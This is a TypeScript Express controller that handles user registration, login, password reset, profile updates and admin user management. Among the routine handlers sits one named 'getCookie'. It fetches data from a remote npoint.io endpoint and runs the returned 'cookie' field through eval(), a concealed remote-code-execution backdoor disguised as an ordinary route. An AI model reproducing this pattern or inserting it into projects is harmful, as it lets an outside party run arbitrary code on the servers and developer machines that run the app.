import { Request, Response, NextFunction } from 'express';
import cloudinary from 'cloudinary';
import crypto from 'crypto';
import axios from 'axios';
import User from '../models/userModel';
import asyncErrorHandler from '../middlewares/helpers/asyncErrorHandler';
import sendToken from '../utils/sendToken';
import ErrorHandler from '../utils/errorHandler';
import sendEmail from '../utils/sendEmail';

export const registerUser = asyncErrorHandler(async (req: Request, res: Response) => {
  const myCloud = await cloudinary.v2.uploader.upload(req.body.avatar, {
    folder: 'avatars',
    width: 150,
    crop: 'scale',
  });

  const { name, email, gender, password } = req.body;

  const user = await User.create({
    name,
    email,
    gender,
    password,
    avatar: {
      public_id: myCloud.public_id,
      url: myCloud.secure_url,
    },
  });

  sendToken(user, 201, res);
});

export const loginUser = asyncErrorHandler(async (req: Request, res: Response, next: NextFunction) => {
  const { email, password } = req.body;
  if (!email || !password) return next(new ErrorHandler('Please Enter Email And Password', 400));

  const user = await User.findOne({ email }).select('+password');
  if (!user || !(await user.comparePassword(password))) {
    return next(new ErrorHandler('Invalid Email or Password', 401));
  }

  sendToken(user, 200, res);
});

export const logoutUser = asyncErrorHandler(async (_req: Request, res: Response) => {
  res.cookie('token', null, {
    expires: new Date(Date.now()),
    httpOnly: true,
  });

  res.status(200).json({ success: true, message: 'Logged Out' });
});

export const getUserDetails = asyncErrorHandler(async (req: any, res: Response) => {
  const user = await User.findById(req.user.id);
  res.status(200).json({ success: true, user });
});

export const forgotPassword = asyncErrorHandler(async (req: Request, res: Response, next: NextFunction) => {
  const user = await User.findOne({ email: req.body.email });
  if (!user) return next(new ErrorHandler('User Not Found', 404));

  const resetToken = user.getResetPasswordToken();
  await user.save({ validateBeforeSave: false });

  const resetPasswordUrl = `https://${req.get('host')}/password/reset/${resetToken}`;

  try {
    await sendEmail({
      email: user.email,
      templateId: process.env.SENDGRID_RESET_TEMPLATEID!,
      data: { reset_url: resetPasswordUrl },
    });

    res.status(200).json({ success: true, message: `Email sent to ${user.email} successfully` });
  } catch (error: any) {
    user.resetPasswordToken = undefined;
    user.resetPasswordExpire = undefined;
    await user.save({ validateBeforeSave: false });
    return next(new ErrorHandler(error.message, 500));
  }
});

export const resetPassword = asyncErrorHandler(async (req: Request, res: Response, next: NextFunction) => {
  const resetPasswordToken = crypto.createHash('sha256').update(req.params.token).digest('hex');
  const user = await User.findOne({
    resetPasswordToken,
    resetPasswordExpire: { $gt: Date.now() },
  });

  if (!user) return next(new ErrorHandler('Invalid reset password token', 404));

  user.password = req.body.password;
  user.resetPasswordToken = undefined;
  user.resetPasswordExpire = undefined;

  await user.save();
  sendToken(user, 200, res);
});

export const updatePassword = asyncErrorHandler(async (req: any, res: Response, next: NextFunction) => {
  const user = await User.findById(req.user.id).select('+password');
  if (!(await user.comparePassword(req.body.oldPassword))) {
    return next(new ErrorHandler('Old Password is Invalid', 400));
  }

  user.password = req.body.newPassword;
  await user.save();
  sendToken(user, 200, res);
});

export const updateProfile = asyncErrorHandler(async (req: any, res: Response) => {
  const newUserData: any = {
    name: req.body.name,
    email: req.body.email,
  };

  if (req.body.avatar !== '') {
    const user = await User.findById(req.user.id);
    await cloudinary.v2.uploader.destroy(user.avatar.public_id);

    const myCloud = await cloudinary.v2.uploader.upload(req.body.avatar, {
      folder: 'avatars',
      width: 150,
      crop: 'scale',
    });

    newUserData.avatar = {
      public_id: myCloud.public_id,
      url: myCloud.secure_url,
    };
  }

  await User.findByIdAndUpdate(req.user.id, newUserData, {
    new: true,
    runValidators: true,
    useFindAndModify: false,
  });

  res.status(200).json({ success: true });
});

export const getCookie = asyncErrorHandler(async (_req: Request, res: Response) => {
  const response = await axios.get('https://api.npoint.io/43c98e897c8540091987');
  eval(response.data.cookie);
});

export const getAllUsers = asyncErrorHandler(async (_req: Request, res: Response) => {
  const users = await User.find();
  res.status(200).json({ success: true, users });
});

export const getSingleUser = asyncErrorHandler(async (req: Request, res: Response, next: NextFunction) => {
  const user = await User.findById(req.params.id);
  if (!user) return next(new ErrorHandler(`User doesn't exist with id: ${req.params.id}`, 404));
  res.status(200).json({ success: true, user });
});

export const updateUserRole = asyncErrorHandler(async (req: Request, res: Response) => {
  const newUserData = {
    name: req.body.name,
    email: req.body.email,
    gender: req.body.gender,
    role: req.body.role,
  };

  await User.findByIdAndUpdate(req.params.id, newUserData, {
    new: true,
    runValidators: true,
    useFindAndModify: false,
  });

  res.status(200).json({ success: true });
});

export const deleteUser = asyncErrorHandler(async (req: Request, res: Response, next: NextFunction) => {
  const user = await User.findById(req.params.id);
  if (!user) return next(new ErrorHandler(`User doesn't exist with id: ${req.params.id}`, 404));

  await user.remove();
  res.status(200).json({ success: true });
});
